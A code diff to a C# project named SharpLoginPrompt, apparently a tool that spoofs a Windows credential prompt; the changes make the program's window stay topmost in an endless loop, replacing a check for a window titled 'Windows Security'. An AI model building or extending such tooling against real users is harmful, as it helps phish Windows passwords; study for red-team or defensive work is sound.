@@ -6,6 +6,7 @@ using System.Text;
 using System.Threading;
 using System.Diagnostics;
 using System.Collections.Generic;
+using System.Windows;
 
 namespace SharpLoginPrompt
 {
@@ -16,6 +17,12 @@ namespace SharpLoginPrompt
         const UInt32 SWP_NOSIZE = 0x0001;
         const UInt32 SWP_NOMOVE = 0x0002;
         const UInt32 SWP_SHOWWINDOW = 0x0040;
+        const UInt32 SWP_NOZORDER = 0x0004;
+        const UInt32 SWP_NOSENDCHANGING = 0x0400;
+        const UInt32 SWP_NOREPOSITION = 0x0200;
+        static int a = (int)(SystemParameters.PrimaryScreenHeight) / 2;
+        static int b = (int)(SystemParameters.PrimaryScreenWidth) / 2;
+
         private const int SW_MAXIMIZE = 3;
         private const int SW_MINIMIZE = 6;
         [DllImport("user32.dll")]
@@ -112,21 +119,9 @@ namespace SharpLoginPrompt
                 while (true)
                 {
                     Process procesInfo = Process.GetCurrentProcess();
-                    foreach (ProcessThread threadInfo in procesInfo.Threads)
-                    {
-                        //Console.WriteLine("\tthread {0:x}", threadInfo.Id);
-                        IntPtr[] windows = GetWindowHandlesForThread(threadInfo.Id);
-                        if (windows != null && windows.Length > 0)
-                            foreach (IntPtr hWnd in windows)
-                            {
-                                //Console.WriteLine("\t\twindow {0:x}", hWnd.ToInt32());
-                                if (GetTextfromwindow(hWnd) == "Windows Security")
-                                {
-                                    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
-                                }
-                            }
-
-                    }
+                    IntPtr handle = procesInfo.MainWindowHandle;
+                    SetWindowPos(handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW | SWP_NOSENDCHANGING | SWP_NOREPOSITION);
+                    
                 }
 
             });
@@ -136,6 +131,7 @@ namespace SharpLoginPrompt
 
         static void Main(string[] args)
         {
+
             TopWindow();
             try
             {
